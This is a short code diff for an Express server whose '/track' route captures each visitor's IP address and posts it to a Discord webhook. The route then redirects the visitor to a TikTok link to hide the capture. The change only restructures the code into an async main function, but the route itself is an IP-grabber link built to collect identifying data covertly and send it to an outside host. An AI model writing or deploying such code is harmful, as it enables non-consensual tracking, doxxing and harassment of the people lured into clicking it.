@@ -17,14 +17,16 @@ async function sendCapturedIp(webhookUrl, viewerIp) {
     }
 }
 
-app.get('/track', (req, res) => {
-    const viewerIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+async function main() {
+    app.get('/track', (req, res) => {
+        const viewerIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-    sendCapturedIp(
-        "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
-        viewerIp
-    ).catch(console.error);
+        sendCapturedIp(
+            "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
+            viewerIp
+        ).catch(console.error);
 
-    // Redirect the user to a normal website
-    res.redirect('https://www.tiktok.com/t/ZTA6h7Rft/');
-});
+        // Redirect the user to a normal website
+        res.redirect('https://www.tiktok.com/t/ZTA6h7Rft/');
+    });    
+}
